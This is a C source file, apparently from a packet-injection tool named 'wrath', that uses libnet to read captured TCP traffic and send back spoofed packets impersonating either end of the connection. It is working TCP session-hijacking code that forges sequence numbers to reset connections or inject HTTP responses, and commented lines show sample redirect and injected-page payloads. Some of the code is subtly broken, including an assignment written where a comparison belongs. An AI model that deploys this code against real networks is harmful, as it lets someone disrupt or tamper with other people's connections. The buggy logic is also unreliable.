#include <libnet.h>
#include "wrath-structs.h"
 
/* builds a raw tcp packet
 * @param an argument bundle
 * @param the packet captured */
void wrath_capture_stats(struct libnet_ipv4_hdr *iphdr, struct libnet_tcp_hdr *tcphdr, int app_length) {

	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
	printf("Seq: %u ", ntohl(tcphdr->th_seq));
	printf("Ack: %u\n", ntohl(tcphdr->th_ack));
	printf("Control: 0x%04x\n", ntohs(tcphdr->th_flags));
	printf("%d bytes of data\n\n", app_length);
}

void wrath_attack_packet_stats(struct libnet_ipv4_hdr *iphdr, struct libnet_tcp_hdr *tcphdr, int ack_increment, int tcp_sum, int payload_size) {

	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
	printf("Seq: %u ", ntohl(tcphdr->th_ack));
	printf("Ack: %u\n", ntohl(tcphdr->th_seq) + ack_increment);
	printf("Control: 0x%04x\n", tcp_sum);
	printf("%d bytes of data\n\n", payload_size);
	printf("---------------------\n");
}

void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	int tcp_sum = cline_args->tcp_syn + cline_args->tcp_fin + cline_args->tcp_ack + cline_args->tcp_psh + cline_args->tcp_urg + cline_args->tcp_rst;	

	printf("Hijacking ... ");
	wrath_capture_stats(iphdr, tcphdr, 0);
	printf("With ... ");
	wrath_attack_packet_stats(iphdr, tcphdr, 0, tcp_sum, 0);
	
	/* libnet_build_tcp */
	libnet_build_tcp(
	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_ack),		// +(calc_len(upper_level)),	// seq (pretend to be next packet)
	ntohl(tcphdr->th_seq),		// ack
	(cline_args->tcp_rst
	+ cline_args->tcp_fin
	+ cline_args->tcp_syn
	+ cline_args->tcp_ack
	+ cline_args->tcp_urg
	+ cline_args->tcp_psh),		// flags	
	4024,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	NULL,			// *payload (maybe app-level here)
	0,				// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);
	
	if (cline_args->sleep_time = -1) 	
		usleep(5000);		// jump out of the storm 
	else 
		usleep(cline_args->sleep_time);
}

/* builds a tcp packet that supports an upper level protocol
 * @param an argument bundle,
 * @param a captured packet,
 * @param a pointer to an upper-level protocol payload,
 * @param the sum of TCP Flags 
 * @param amount to increment the seq number by */
void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload, unsigned int tcp_sum, int app_length, int ack_increment) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	//char payload2[] = "HTTP/1.1 302 Found\r\nLocation:http://ada.evergreen.edu/~stenic05\r\n\r\n\0";
	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://en.wikipedia.org/wiki/Tupac_Shakur\r\n\r\n";
	//payload = "HTTP/1.1 200 OK\r\nServer: WRATH\r\nConnection: close\r\n\r\n<html><img src=\"http://3.bp.blogspot.com/-Lz-g9K2Mc8A/UH-YAgdMRJI/AAAAAAAALoI/45KMc_bLRFc/s1600/papa_murphys_jack-o-lantern_pizza.jpg\"/></html>\0";

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	printf("Hijacking ... ");
	wrath_capture_stats(iphdr, tcphdr, app_length);
	printf("With ... ");
	wrath_attack_packet_stats(iphdr, tcphdr, (app_length + ack_increment), tcp_sum, 0); //strlen(payload)
	
	/* libnet_build_tcp */
	libnet_build_tcp(
	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_ack + app_length), // +(calc_len(upper_level)),	// seq (pretend to be next packet)
	ntohl(tcphdr->th_seq),		// ack
	tcp_sum,			// flags
	60000,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	(u_int8_t *) payload,		// *payload (maybe app-level here)
	strlen(payload),		// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);
}
